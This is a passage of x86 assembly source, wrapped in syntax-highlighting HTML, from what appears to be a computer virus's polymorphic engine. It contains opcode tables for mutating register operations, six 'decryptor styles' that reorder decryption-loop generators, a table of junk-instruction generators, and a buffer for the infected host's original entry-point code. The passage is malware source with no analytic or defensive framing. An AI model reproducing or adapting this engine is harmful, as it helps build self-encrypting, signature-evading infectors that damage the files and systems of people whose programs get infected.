                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_xor_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_inc_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_dec_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_not_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_add_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_sub_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_xor_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_inc_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_dec_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_not_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">94h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_add_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_sub_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_xor_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_dword</span><span class="sc0">

                </span><span class="sc1">;Reverse-code strings</span><span class="sc0">

</span><span class="sc5">x_inc_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_inc_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_inc_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_dec_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_dec_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_dec_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_not_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_not_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">0F7h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_not_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0F7h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_add_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_add_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_add_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_sub_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_sub_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_sub_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_xor_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_xor_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_xor_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">

                </span><span class="sc1">;Decryptor styles</span><span class="sc0">

</span><span class="sc5">tbl_styles</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">style_gen_1</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">style_gen_2</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">style_gen_3</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">style_gen_4</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">style_gen_5</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">style_gen_6</span><span class="sc0">

</span><span class="sc5">end_styles</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">style_gen_1</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_get_delta</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_fix_ptr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_load_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_decrypt</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_step</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_loop</span><span class="sc0">

</span><span class="sc5">style_gen_2</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_get_delta</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_load_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_fix_ptr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_decrypt</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_step</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_loop</span><span class="sc0">

</span><span class="sc5">style_gen_3</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_load_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_get_delta</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_fix_ptr</span><span class="sc0">                
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_decrypt</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_step</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_loop</span><span class="sc0">

</span><span class="sc5">style_gen_4</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_get_delta</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_fix_ptr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_load_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_decrypt</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_step</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_loop</span><span class="sc0">

</span><span class="sc5">style_gen_5</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_get_delta</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_load_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_fix_ptr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_decrypt</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_step</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_loop</span><span class="sc0">

</span><span class="sc5">style_gen_6</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_load_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_get_delta</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_fix_ptr</span><span class="sc0">                
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_decrypt</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_step</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_loop</span><span class="sc0">

                </span><span class="sc1">;Garbage code generators</span><span class="sc0">

</span><span class="sc5">tbl_garbage</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_save_code</span><span class="sc0">         </span><span class="sc1">;clc stc cmc cld std</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg32imm</span><span class="sc0">         </span><span class="sc1">;mov reg32,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg16imm</span><span class="sc0">         </span><span class="sc1">;mov reg16,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg8imm</span><span class="sc0">          </span><span class="sc1">;mov reg8,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg32</span><span class="sc0">         </span><span class="sc1">;mov reg32,reg32</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg16</span><span class="sc0">         </span><span class="sc1">;mov reg16,reg16</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg8</span><span class="sc0">          </span><span class="sc1">;mov reg8,reg8</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregimm32</span><span class="sc0">        </span><span class="sc1">;math reg32,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregimm16</span><span class="sc0">        </span><span class="sc1">;math reg16,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregimm8</span><span class="sc0">         </span><span class="sc1">;math reg8,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_push_g_pop</span><span class="sc0">          </span><span class="sc1">;push reg/garbage/pop reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_jump_u</span><span class="sc0">              </span><span class="sc1">;jump/rnd block</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_jump_c</span><span class="sc0">              </span><span class="sc1">;jump conditional/garbage</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movzx_movsx</span><span class="sc0">         </span><span class="sc1">;movzx/movsx reg32,reg16</span><span class="sc0">

</span><span class="sc5">end_garbage</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc1">;Original code at host entry point</span><span class="sc0">

</span><span class="sc5">entry_code</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">BUFFER_EP</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc1">;Polymorphic procedures works with byte/word/dword</span><span class="sc0">
                </span><span class="sc1">;We let here a dword to avoid buffer overwrites</span><span class="sc0">

